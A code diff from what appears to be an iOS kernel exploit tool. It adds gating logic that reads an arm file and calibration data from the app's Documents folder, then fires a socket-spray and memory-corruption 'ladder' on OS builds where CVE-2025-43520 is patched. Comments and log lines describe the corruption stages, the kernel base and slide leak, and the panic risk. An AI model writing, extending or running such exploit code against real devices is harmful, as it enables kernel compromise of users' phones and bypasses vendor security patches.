@@ -86,6 +86,32 @@ static void cs2_write_banner(void) {
     cs2_log("        -> pcb_start_offset / target corrupted -> kernel_base / kernel_slide");
 }
 
+/* LightSword arm license (2026-10-24): the LightSword calib has PROVEN the
+   phys_oob copy confusion on trains the CVE-2025-43520 gate refuses —
+   24A435/27.0: 4 WRONG crossings (0xba0000 recurring across boots,
+   0x57c0000/0x6840000/0x7ee0000) with zero configd starvation across a dozen
+   400k-900k-socket sprays. An arm file (Documents/lswkrw_arm.txt) + a calib
+   hot set (>=4 windows) licenses this ladder on a patched train. Panic
+   possible; one tap per fresh boot; ladder prints are the dial-finder. */
+static BOOL lsword_arm_licensed(int *windows) {
+    *windows = 0;
+    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+    if (![NSFileManager.defaultManager fileExistsAtPath:[docs stringByAppendingPathComponent:@"lswkrw_arm.txt"]]) return NO;
+    NSString *hot = [NSString stringWithContentsOfFile:[docs stringByAppendingPathComponent:@"lightsword_hot.txt"]
+                                              encoding:NSUTF8StringEncoding error:nil];
+    if (!hot) hot = [NSString stringWithContentsOfFile:[docs stringByAppendingPathComponent:@"racecalib_hot.txt"]
+                                              encoding:NSUTF8StringEncoding error:nil];
+    __block int n = 0;
+    if (hot.length) {
+        [[hot componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]]
+            enumerateObjectsUsingBlock:^(NSString *line, NSUInteger idx, BOOL *stop) {
+                if (line.length >= 2 && [line hasPrefix:@"0x"]) n++;
+            }];
+    }
+    *windows = n;
+    return n >= 4;
+}
+
 @implementation CS2Runner
 
 + (NSString *)runUpstream {
@@ -101,12 +127,23 @@ static void cs2_write_banner(void) {
     cs2_write_banner();
 
     if (!cs2_cve43520_viable()) {
-        cs2_log("[-] SKIP: CVE-2025-43520 patched on this build train (18.7.2/26.1+).");
-        cs2_log("[-] Firing the spray here only starves configd -> userspace watchdog (23G71 2026-10-20 WoD).");
-        cs2_log("[*] Viable trains: <=21D, 22A-22G, 23A. 23B+ SKUs: LightSword stalepage lane instead.");
-        if (g_cs2_log_fd >= 0) { close(g_cs2_log_fd); g_cs2_log_fd = -1; }
-        g_cs2_running = NO;
-        return @"cs2 SKIP (patched train) — no spray fired. Use LightSword/LightSwordCalib/CSKRW lanes here.";
+        int wins = 0;
+        if (lsword_arm_licensed(&wins)) {
+            cs2_log("[LSWORD-ARM] LightSword license: arm file present + calib hot set = %d windows.", wins);
+            cs2_log("[LSWORD-ARM] phys_oob copy confusion PROVEN on this train (calib WRONG crossings;");
+            cs2_log("[LSWORD-ARM] zero configd starvation across a dozen 400k-900k socket sprays).");
+            cs2_log("[LSWORD-ARM] Firing the cs2 ladder anyway — hop-1 cluster_*_contig may EINVAL;");
+            cs2_log("[LSWORD-ARM] the pcb scan / copy / corrupt stages are this calib's proven class.");
+            cs2_log("[LSWORD-ARM] PANIC POSSIBLE — one tap per fresh boot. Ladder prints = dial-finder.");
+        } else {
+            cs2_log("[-] SKIP: CVE-2025-43520 patched on this build train (18.7.2/26.1+).");
+            cs2_log("[-] Firing the spray here only starves configd -> userspace watchdog (23G71 2026-10-20 WoD).");
+            cs2_log("[*] Viable trains: <=21D, 22A-22G, 23A. 23B+ SKUs: LightSword stalepage lane instead.");
+            cs2_log("[*] ARM PATH: run LightSword calib (>=4 hot windows) then write lswkrw_arm.txt (tap lswarm).");
+            if (g_cs2_log_fd >= 0) { close(g_cs2_log_fd); g_cs2_log_fd = -1; }
+            g_cs2_running = NO;
+            return @"cs2 SKIP (patched train, unarmed) — calib >=4 windows + lswarm tap = LightSword arm.";
+        }
     }
 
     cs2_stop = 0;
